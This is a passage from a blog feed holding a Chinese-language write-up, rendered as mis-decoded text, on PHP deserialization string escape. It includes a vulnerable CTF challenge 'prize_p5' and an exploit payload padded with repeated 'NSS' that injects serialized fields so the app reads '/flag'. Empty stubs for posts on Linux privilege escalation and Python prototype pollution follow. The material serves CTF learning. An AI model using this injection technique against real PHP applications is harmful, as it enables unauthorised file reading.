title="å­—ç¬¦é€ƒé€¸çš„åŸç†"></a>å­—ç¬¦é€ƒé€¸çš„åŸç†</h2><p>é¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“ååºåˆ—çš„ç»“æŸä½ç½®ã€‚å½“ååºåˆ—åŒ–é‡åˆ°<code>;&#125;</code>æ—¶å°±ä¼šåœæ­¢ã€‚æ³¨æ„<code>;&#125;</code>æ˜¯ä¸èƒ½åŒ…å«å†å­—ç¬¦ä¸²é‡Œçš„å³åƒ<code>s:5:&quot;lll;&#125;&quot;;&#125;</code>å‰ä¸€ä¸ª<code>;&#125;</code>æ˜¯å­—ç¬¦ä¸²çš„ç¬¬4,5ä¸ªå­—ç¬¦ï¼Œè¿™å°±å¯¼è‡´äº†å…¶æ— æ³•å°†ååºåˆ—æå‰ç»“æŸã€‚<br>ä½†æ˜¯å¦‚æœç”±äºwafå¯¼è‡´å­—ç¬¦å˜å¤šæˆ–è€…å‡å°‘è¿™å°±ä¼šå¯¼è‡´ï¼ŒåŸæœ¬åº”è¯¥è¢«è§£æä¸ºå­—ç¬¦çš„å­—ç¬¦è¢«è§£æä¸ºç‰¹æ®Šå­—ç¬¦ï¼Œä½¿å¾—ååºåˆ—çš„ç»“æœè¢«æ›´æ”¹ã€‚</p><h2 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h2><p>è¿˜æ˜¯æ‹¿ä¸Šé¢çš„å‡½æ•°æ¥ä½œä¸ºwafæ¥è§£é‡Š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">black_list</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/flag/i&#x27;</span>,<span class="string">&#x27;hacker~&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;flag&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&quot;lalalalala&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">E</span>());</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">black_list</span>(<span class="variable">$a</span>)</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç å°±å­˜åœ¨å­—ç¬¦é€ƒé€¸å­—ç¬¦å¢å¤šçš„æ¼æ´<br>æˆ‘ä»¬è¦åˆ©ç”¨ä¿®æ”¹<code>$a</code>çš„å€¼æ¥å°è¯•ä¿®æ”¹$bçš„å€¼ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;E&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;hacker~&quot;</span>;&#125;;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;lalalalala&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„çš„flagå˜æˆäº†<code>hacker~</code>æ­£å¥½å’Œ<code>flag&quot;;&#125;</code>çš„é•¿åº¦ç›¸åŒé‚£ä¹ˆè¿™å°±å¯¼è‡´äº†hacker~è¢«è¯†åˆ«ä¸ºäº†å­—ç¬¦ä¸²è€Œ<code>&quot;;&#125;</code>è¢«è¯†åˆ«ä¸ºäº†ç‰¹æ®Šå­—ç¬¦ã€‚è¿™å°±å¯¼è‡´äº†ååºåˆ—æ˜¯é‡åˆ°äº†<code>;&#125;</code>æå‰ç»“æŸã€‚è¿™å°±æ˜¯wafé”™è¯¯çš„å°†ååºåˆ—çš„çš„å­—ç¬¦å¢å¤šå¯¼è‡´äº†<code>&quot;;&#125;</code>é€ƒé€¸å‡ºå­—ç¬¦ä¸²è¢«è§£æä¸ºååºåˆ—è¯­å¥ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†<code>&quot;;&#125;</code>è¿›è¡Œæ›´æ”¹æ›´æ”¹æˆ<code>&quot;;s:1:&quot;b&quot;;s:10:&quot;hahahahaha&quot;;&#125;</code>å¦‚æœè¿™å¥è¯è¢«é€ƒé€¸å°±ä¼šé€ æˆååºåˆ—çš„ç»“æœè¢«æ›´æ”¹å³ç±»çš„å±æ€§è¢«æ›´æ”¹ã€‚<br>å¦‚æœè¦ä½¿<code>&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;</code>é€ƒé€¸å°±è¦ä½¿popé“¾å†è¢«wafæ›´æ”¹åçš„å­—ç¬¦å¢å¤šç›¸åŒå­—ç¬¦æ•°ã€‚å¦‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;E&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;flagflagflagflagflagflagflagflag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;hhhhahahahaha&quot;</span>;&#125;<span class="string">&quot;;s:1:&quot;</span>b<span class="string">&quot;;s:10:&quot;</span>lalalalala<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬ä¼ å…¥çš„<code>$a</code>å€¼ä¸º<code>flagflagflagflagflagflagflagflag&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;</code>ä¼ å…¥äº†8ä¸ªflagå†ç»è¿‡wafåå˜ä¸º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:64:&quot;hacker~hacker~hacker~hacker~hacker~hacker~hacker~hacker~&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:10:&quot;lalalalala&quot;;&#125;</span><br></pre></td></tr></table></figure><br>æ›¿æ¢åçš„å­—ç¬¦æ­£å¥½ä¸º64ä¸ªå³å¤šå‡ºæ¥çš„å­—ç¬¦æ•°æ•´å¥½ä¸ºéœ€è¦é€ƒé€¸çš„å­—ç¬¦æ•°ã€‚å¯¼è‡´<code>&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;</code>é€ƒé€¸è¿™å°±ä½¿å¾—<code>&quot;</code>é—­åˆå‰ä¸€ä¸ªå¼•å·<code>;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;</code>è¢«è§£æä¸ºååºåˆ—åŒ–é“¾ã€‚è¿™å°±ä½¿å¾—è¢«è§£æåçš„bå˜ä¸ºäº†hhhhhahahahaè€Œä¸æ˜¯lalalalalalaã€‚</p><h1 id="å­—ç¬¦å‡å°‘"><a href="#å­—ç¬¦å‡å°‘" class="headerlink" title="å­—ç¬¦å‡å°‘"></a>å­—ç¬¦å‡å°‘</h1><p>å­—ç¬¦å‡å°‘çš„å­—ç¬¦é€ƒé€¸å…¶å®æœ¬è´¨åŸç†å’Œå¢å¤šæ˜¯ä¸€æ ·çš„ï¼Œæ˜¯å°†æœ¬æ”¹è§£æä¸ºå­—ç¬¦ä¸²çš„è§£ææˆäº†éå­—ç¬¦ä¸²å¯¼è‡´äº†ååºåˆ—çš„ç»“æœå‘ç”Ÿæ”¹å˜ã€‚<br>æˆ‘è¿™é‡Œå°±ç›´æ¥æ”¾ä¾‹å­äº†<br>æˆ‘ä»¬è¿™é‡Œå‡è®¾flagä¼šè¢«ç›´æ¥è§£ææˆç©º<br>æˆ‘ä»¬è§‚å¯Ÿä¸‹é¢çš„åºåˆ—åŒ–è¯­å¥<br><img src="/2024/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/1.png" class="" title="alt text"><br>ä¼šå‘ç°å¦‚æœæˆ‘ä»¬å¯ä»¥å°†ç¬¬ä¸€ä¸ªå±æ€§çš„å­—ç¬¦ä¸²å‡å°‘ä½¿å¾—ç¬¬äºŒä¸ªå±æ€§å³çº¢è‰²çš„åŸæœ¬ä¸ºåºåˆ—åŒ–è¯­å¥çš„éƒ¨åˆ†è¢«è§£ææˆå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæˆ‘ä»¬åŸæœ¬æ„é€ çš„å­—ç¬¦ä¸²å°±ä¼šè¢«é€ƒé€¸å‡ºå»ã€‚<br>çº¢è‰²éƒ¨åˆ†ä¸º16ä¸ªå­—ç¬¦å³æˆ‘ä»¬åªè¦åœ¨ç¬¬ä¸€ä¸ªå±æ€§é‡Œæ„é€ ä¸€ä¸ªä¼šè¢«wafå‡å°‘16ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²å³å¯å°†çº¢è‰²éƒ¨åˆ†è§£ææˆå­—ç¬¦ä¸²ä½¿å¾—æˆ‘ä»¬æ„é€ çš„ç»¿è‰²éƒ¨åˆ†é€ƒé€¸å³å­—ç¬¦ä¸²å‡å°‘çš„é€ƒé€¸ä¸å¢å¤šçš„åœ¨paylaodä¸Šæ„é€ çš„å”¯ä¸€åŒºåˆ«å°±æ˜¯ä¸€ä¸ªæ˜¯è¦å¢å¤šä¸éœ€è¦é€ƒé€¸çš„å­—ç¬¦ä¸²ç›¸åŒæ•°é‡çš„å­—ç¬¦ï¼Œä¸€ä¸ªè¦å‡å°‘åˆ°éœ€è¦é€ƒé€¸çš„å­—ç¬¦ä¸²çš„æ•°é‡çš„å­—ç¬¦ã€‚</p><h1 id="é¢˜ç›®prize-p5-å­—ç¬¦å¢å¤š"><a href="#é¢˜ç›®prize-p5-å­—ç¬¦å¢å¤š" class="headerlink" title="é¢˜ç›®prize_p5(å­—ç¬¦å¢å¤š)"></a>é¢˜ç›®prize_p5(å­—ç¬¦å¢å¤š)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">catalogue</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = &quot;<span class="title">error</span>&quot;;</span></span><br><span class="line"><span class="class">        $<span class="title">this</span>-&gt;<span class="title">data</span> = &quot;<span class="title">hacker</span>&quot;;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__destruct</span>()</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>($<span class="title">this</span>-&gt;<span class="title">data</span>);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">error</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$OTL</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;OTL = <span class="variable">$OTL</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="variable language_">$this</span>-&gt;OTL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">escape</span></span>&#123;                                                                   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;OTL&#x27;</span>;                                                 </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$phone</span> = <span class="string">&#x27;123666&#x27;</span>;                                             </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span> = <span class="string">&#x27;sweet@OTL.com&#x27;</span>;                          </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abscond</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="keyword">array</span>(<span class="string">&#x27;NSS&#x27;</span>, <span class="string">&#x27;CTF&#x27;</span>, <span class="string">&#x27;OTL_QAQ&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$filter</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cata&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/object/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cata&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cata&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$cc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">catalogue</span>(); </span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$cc</span>));           </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono,you can not do that!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$abscond</span> = <span class="keyword">new</span> <span class="title function_ invoke__">escape</span>();</span><br><span class="line">        <span class="variable">$abscond</span>-&gt;name = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$abscond</span>-&gt;phone = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">        <span class="variable">$abscond</span>-&gt;email = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="variable">$abscond</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$abscond</span>);</span><br><span class="line">        <span class="variable">$escape</span> = <span class="title function_ invoke__">get_object_vars</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">abscond</span>(<span class="variable">$abscond</span>)));</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$escape</span>[<span class="string">&#x27;phone&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$escape</span>[<span class="string">&#x27;email&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;I&#x27;m sorry to tell you that you are wrong&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä»”ç»†è§‚å¯Ÿæºç ä¼šå‘ç°ï¼Œè¯¥é¢˜ç›®æœ‰ä¸¤ç§è§£æ³•ï¼Œä¸€ç§æ˜¯åˆ©ç”¨åŸç”Ÿç±»ä¸€ç§æ˜¯åˆ©ç”¨å­—ç¬¦ä¸²é€ƒé€¸ï¼Œè¿™é‡Œæˆ‘åªè®²å­—ç¬¦é€ƒé€¸çš„éƒ¨åˆ†ã€‚<br>æˆ‘ä»¬åªè¦ç»™cataéšä¾¿ä¼ ä¸ªå€¼å°±ä¼šåˆ°ä¸‹é¢è¿™å¥ä»£ç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;nonono,you can not do that!&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$abscond</span> = <span class="keyword">new</span> <span class="title function_ invoke__">escape</span>();</span><br><span class="line">       <span class="variable">$abscond</span>-&gt;name = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">       <span class="variable">$abscond</span>-&gt;phone = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">       <span class="variable">$abscond</span>-&gt;email = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">       <span class="variable">$abscond</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$abscond</span>);</span><br><span class="line">       <span class="variable">$escape</span> = <span class="title function_ invoke__">get_object_vars</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">abscond</span>(<span class="variable">$abscond</span>)));</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$escape</span>[<span class="string">&#x27;phone&#x27;</span>]))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$escape</span>[<span class="string">&#x27;email&#x27;</span>]));</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;I&#x27;m sorry to tell you that you are wrong&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ä¼šä½¿ç”¨file_get_contentsè¿™ä¸ªå‡½æ•°æ¥è·å–æ–‡ä»¶å†…å®¹åˆ°å­—ç¬¦ä¸²ä¸­ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°emailè®¾äº†wafä¸å¯ä»¥ä¼ å…¥emailçš„å€¼ä¸ºflagã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶åœ¨åºåˆ—åŒ–ä¹‹å‰å…ˆä½¿ç”¨wafæ¥æ›¿æ¢äº†ä¸€ä¸‹å­—ç¬¦ä¸²abscond($abscond)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abscond</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="keyword">array</span>(<span class="string">&#x27;NSS&#x27;</span>, <span class="string">&#x27;CTF&#x27;</span>, <span class="string">&#x27;OTL_QAQ&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$filter</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªwafä¼šå°†NSSè½¬åŒ–æˆhackerã€‚è¿™å°±å¯¼è‡´äº†å­—ç¬¦çš„å¢å¤šã€‚æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨å­—ç¬¦é€ƒé€¸æ¥ä¿®æ”¹emailçš„å€¼ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;escape&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;aaaa&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;</span><br><span class="line">````</span><br><span class="line">å¦‚æœååºåˆ—åŒ–ä¸ºä¸Šé¢çš„è¯­å¥å°±ä¼šä½¿emailä¸º<span class="string">&quot;/flag&quot;</span>ä½¿flagè¢«è¾“å‡ºã€‚</span><br><span class="line">ä½†æ˜¯wafçš„å­˜åœ¨å¯¼è‡´æˆ‘ä»¬æ— æ³•ç›´æ¥æ„é€ ä¸Šé¢çš„è¿™å¥è¯ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦é€ƒé€¸ã€‚ç”±äºè¦æ±‚phoneä¸ºæ•°ç»„æ‰€ä»¥æˆ‘ä»¬è¦è¿ç€phoneä¸€èµ·é€ƒé€¸ã€‚å³é€ƒé€¸è¯­å¥ä¸º`<span class="string">&quot;;s:5:&quot;</span>phone<span class="string">&quot;;a:1:&#123;i:0;s:4:&quot;</span>aaaa<span class="string">&quot;;&#125;s:5:&quot;</span>email<span class="string">&quot;;s:5:&quot;</span>/flag<span class="string">&quot;;&#125;`æ”¹é€ƒé€¸è¯­å¥ä¸º60ä¸ªå­—ç¬¦å³æˆ‘ä»¬è¦å¤š60ä¸ªå­—ç¬¦æ‰èƒ½ä½¿å…¶é€ƒé€¸ã€‚</span></span><br><span class="line"><span class="string">exp</span></span><br><span class="line"><span class="string">```php</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">class escape&#123;</span></span><br><span class="line"><span class="string">public <span class="subst">$name</span> = &#x27;NSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSS&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;aaaa&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">public $phone=array(aaaa);</span></span><br><span class="line"><span class="string">public $email = &#x27;</span><span class="number">1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$a=new escape();</span></span><br><span class="line"><span class="string">echo urlencode(serialize($a));</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><br>æ‰€ä»¥æˆ‘ä»¬åªè¦ç»™nameä¼ å€¼ä¸º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSS&quot;;s:5:&quot;phone&quot;;a:1:&#123;i:0;s:4:&quot;aaaa&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</span><br></pre></td></tr></table></figure><br>å³å¯</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> ååºåˆ—åŒ– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢linuxææƒ</title>
      <link href="/2024/03/11/%E5%88%9D%E6%8E%A2linux%E6%8F%90%E6%9D%83/"/>
      <url>/2024/03/11/%E5%88%9D%E6%8E%A2linux%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ææƒ </tag>
            
            <tag> liunx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢pythonåŸå‹é“¾æ±¡æŸ“</title>
      <link href="/2024/03/09/%E5%88%9D%E6%8E%A2python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2024/03/09/%E5%88%9D%E6%8E%A2python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
